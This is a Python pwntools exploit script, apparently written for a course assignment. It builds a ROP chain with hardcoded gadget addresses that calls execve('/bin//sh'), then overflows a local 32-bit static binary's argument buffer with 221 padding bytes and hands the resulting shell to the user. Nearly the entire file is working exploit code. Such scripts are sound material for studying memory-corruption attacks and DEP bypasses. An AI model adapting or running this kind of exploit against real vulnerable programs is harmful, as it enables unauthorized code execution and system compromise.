#!/usr/bin/env python
# encoding: utf-8

from pwn import *
from struct import pack

# execve generated by ROPgadget


# Padding goes here
p = ''

p += pack('<I', 0x0806f23a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b7ff6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f23a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b7ff6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f23a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049383) # xor eax, eax ; ret
p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080d54e0) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806f23a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049383) # xor eax, eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0807aa7f) # inc eax ; ret
p += pack('<I', 0x0806ceae) # int 0x80

def main():

    payload = "A"*221 + p
    # args
    argv = ['./proj1_dep_static_Reed.Brian', payload, '\x00']
    # Start a process
    proc = process(argv = argv)

    # Print the pid
    raw_input(str(proc.proc.pid))

    # Send the payload to the binary
    # p.send(payload)

    # Pass interaction back to the user
    proc.interactive()

if __name__ == "__main__":
    main()
